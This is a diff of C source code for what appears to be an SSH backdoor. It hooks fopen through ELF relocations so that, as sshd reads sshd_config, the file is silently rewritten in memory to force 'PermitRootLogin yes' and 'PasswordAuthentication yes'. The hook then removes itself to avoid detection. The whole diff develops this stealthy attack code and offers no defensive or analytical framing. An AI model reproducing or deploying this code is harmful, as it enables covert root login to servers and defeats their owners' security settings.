@@ -18,72 +18,95 @@
 static int hook_rela(Elf64_Rela *foundrela, void *func, int type);
 
 /*
- * the goal is to make sure PermitRootLogin is set to yes - regardless if it is explicity set or not
- *	and then unhook ourselves sneaky beaky like
- * TODO: sanity
- * TODO: read sshd.c -- very possible fopen(sshd_config) is the first ever fopen
- * TODO: no need to read() - use strcat() and getline()
- * XXX: there is probably an easier way to do what I'm trying to do with bitmasks, but I like the practice and it feels cool
+ * the goal is to make sure PermitRootLogin&&PasswordAuthentication is set to yes
+ *	regardless if it is explicity set or not
+ *	and then unhook ourselves from fopen sneaky beaky like
+ *
+ * TODO: fix symbol visibility in FINAL version -- we cannot be exporting my_fopen and ref_fopen
+ * TODO: sanity && abort()
+ * TODO: use strcasestr() TODO TODO TODO
+ * XXX: there is probably an easier way to do what I'm trying to do with bitmasks
+ *		-- enum/union doesn't seem correct here.
  */
 FILE *my_fopen(char *filename, char *mode)
 {
 	FILE *fp = ref_fopen(filename, mode);
 	fpos_t ref_pos;
-
 	fgetpos(fp, &ref_pos);
 
+	/* get file size on disk of filename */	
+	signed long int orig_sshd_config_size;
+	struct stat st;	
+	stat(filename, &st);
+	orig_sshd_config_size = (signed long int) st.st_size;
 
-	char *str = malloc(sizeof(512));
-	size_t n = 0;
-	/* 
-	 * libkeyutils hates _GNU_SOURCE and I haven't bothered to learn about Makefiles and advanced #define usage
-	 * 	so no strcasestr();
-	 * TODO TODO TODO: use strcasestr() TODO TODO TODO
-	 */
+	/* these strings will store pointers found from strstr() */
 	char *PermitRootLogin = NULL;
 	char *PasswordAuthentication = NULL;
+
+	/* these maintain a reference to the string we are going to replace
+	 * 	so strlen() is correct in later _WORK()s
+	 */
 	char *ref_PRL;
 	char *ref_PA = "PasswordAuthentication no\n";
 
+	/* setup so we don't have to use strcat() */
+	int buf_len = orig_sshd_config_size + 150;
+	char *buf = malloc(buf_len);	
+	int buf_off = 0;
+	int getline_len = 0; /* using n from getline() has been wrong - n has lost my trust */
+
+
 	uint64_t BITMASK = MASK_64;	
 
+	char *str = malloc(512);
+	size_t n = 0;
 	int ret = 42;
 	while (ret != -1) {
-		ret = getline(&str, &n, fp); /* XXX: should hopefully be safe ?? */
-	
-
-		if (strncmp(str, "PermitRootLogin ", strlen("PermitRootLogin ")) == 0)
-			PermitRootLogin = strstr(str, "PermitRootLogin");
-
-		/* determine if PermitRootLogin is explicity set to (Yes || No) - (case insensitive) */
-		/* PermitRootLogin without-password && PermitRootLogin forced-commands-only */
-
-		if (PermitRootLogin != NULL) {
-
-			/* clear any previously set PermitRootLogin flags -- it's possible for a sshd_config to have duplicates */
-			BITMASK &= ~ PermitRootLogin_MASK;
-
-			/* we have a valid PermitRootLogin string - not commented 
-			 *		if the string is set to yes then there is NOWORK to be done
-			 *		otherwise we will have to EXPLICITly redefine no
-			 */
-
-			char *setting = strstr(PermitRootLogin, "Yes");	
-			if (setting == NULL)
-				setting = strstr(PermitRootLogin, "yes");	
+		ret = getline(&str, &n, fp);
+		if (ret < 0)
+			break;
 		
-			if (setting != NULL) {
-				BITMASK |= PermitRootLogin_NOWORK;
-			} else {
-				/* PermitRootLogin [y-Y]es is not valid, but there is a valid PermitRootLogin string */
-				BITMASK |= PermitRootLogin_EXPLICIT;
+		/* functionally similar to strcat(buf, str) - in half the time */	
+		getline_len = strlen(str);
+
+		memcpy(buf + buf_off, str, getline_len);
+
+		buf_off += getline_len;
+
+
+		if (strncmp(str, "PermitRootLogin ", strlen("PermitRootLogin ")) == 0) {
+			/* PermitRootLogin and strstr() is dumb now - we can wrap these iffs into a function and lose an extra pointer(PermitRootLogin) */
+			//PermitRootLogin = strstr(str, "PermitRootLogin"); 
+			PermitRootLogin = str;	
+		
+			if (PermitRootLogin != NULL) {
+
+				/* clear any previously set PermitRootLogin flags -- it's possible for a sshd_config to have duplicates */
+				BITMASK &= ~ PermitRootLogin_MASK;
+
+				/* we have a valid PermitRootLogin string - not commented due to strNcmp
+				 *	if the string is set to yes then there is NOWORK to be done
+				 *	otherwise we will have to EXPLICITly redefine no
+				 */
+
+				char *setting = strstr(PermitRootLogin, "Yes");	
+				if (setting == NULL)
+					setting = strstr(PermitRootLogin, "yes");	
+			
+				if (setting != NULL) {
+					BITMASK |= PermitRootLogin_NOWORK;
+				} else {
+					/* PermitRootLogin [y-Y]es is not valid, but there is a valid PermitRootLogin string */
+					BITMASK |= PermitRootLogin_EXPLICIT;
+				}
+
+				ref_PRL = strdup(PermitRootLogin);
+				PermitRootLogin = NULL;
 			}
-
-			ref_PRL = strdup(PermitRootLogin);
-			PermitRootLogin = NULL;
-		}
-
-
+		} 
+		
+		
 		if (strncmp(str, "PasswordAuthentication ", strlen("PasswordAuthentication ")) == 0) {
 			PasswordAuthentication = strstr(str, "PasswordAuthentication");
 
@@ -105,19 +128,12 @@ FILE *my_fopen(char *filename, char *mode)
 				PasswordAuthentication = NULL;
 			}
 		}
+
 	}
 	free(str);
-	//fclose(fp); /* XXX: will be useful if something goes wrong later */
-	
+	/*fclose(fp);	 */
+
 	/* we have parsed the whole of filename and the BITMASK has been [un]set accordingly */
-
-	
-	/* get file size on disk of filename */	
-	signed long int orig_sshd_config_size;
-	struct stat st;	
-	stat(filename, &st);
-	orig_sshd_config_size = (signed long int) st.st_size;
-
 
 	/* if we never ran into any of the strings we wanted in sshd_config 
 	 *	 -- BITMASK is unset
@@ -135,20 +151,6 @@ FILE *my_fopen(char *filename, char *mode)
 	if (tmpmask != PasswordAuthentication_EXPLICIT && tmpmask != PermitRootLogin_NOWORK)
 		BITMASK |= PasswordAuthentication_APPEND;
 	
-
-
-	/* read() filename's contents into a buffer we can manipulate */
-
-	int buf_len = orig_sshd_config_size + 150; /* what's 150 bytes between friends? */
-	char *buf = malloc(buf_len);
-
-	int orig_fd = open(filename, O_RDONLY);
-
-	read(orig_fd, buf, orig_sshd_config_size);
-	buf[orig_sshd_config_size] = '\0';
-
-	close(orig_fd);
-	/* we now have the original sshd_config from filename in memory - buf */
 
 
 	char *PRL_Y = "PermitRootLogin yes\n";
@@ -181,12 +183,12 @@ FILE *my_fopen(char *filename, char *mode)
 	
 	ftruncate(fd, buf_len);
 
-	mmap(0, buf_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0 );
+	mmap(0, buf_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 
 	write(fd, new, buf_len);
 
 	fp = fdopen(fd, mode);
-	rewind(fp);
+	rewind(fp); /* important */
 	
 	shm_unlink("/7355608");
 
@@ -203,7 +205,7 @@ int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, c
 	
 
 	/* dup buf into tok_buf to preserve our original sshd_config -- *__buf is getting clobbered */
-	char *tok_buf = malloc(buf_len); /* FIXME: this will leak */
+	char tok_buf[buf_len];
 	memcpy(tok_buf, *__buf, buf_len);
 
 
@@ -252,14 +254,12 @@ int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, c
 				(char *) *__buf + bytes_from_start + strlen(old),
 				strlen((char *) *__buf + bytes_from_start));
 
-	//free(tok_buf);
 	free(*__buf);
 	*__buf = *__new;
 	
 	return 0;
 }
 
-/* XXX:cleanup **__new */
 int _APPEND_work(char **__new, int *_buf_len, char *filename, char *append)
 {
 	int buf_len = *_buf_len;
@@ -268,7 +268,7 @@ int _APPEND_work(char **__new, int *_buf_len, char *filename, char *append)
 	if (*__new == NULL)  {
 		*__new = malloc(buf_len);
 		int orig_fd = open(filename, O_RDONLY);
-		read(orig_fd, *__new, buf_len);
+		read(orig_fd, *__new, buf_len); /* XXX: read past EOF */
 		close(orig_fd);
 	}	
 	
@@ -283,7 +283,6 @@ int _APPEND_work(char **__new, int *_buf_len, char *filename, char *append)
 		*_buf_len = *_buf_len + append_len;
 	}
 
-	/* XXX: do timing tests on how long strncat takes */
 	memcpy((char *) *__new + newlen, append, append_len);
 
 	/* ensure null termination */	
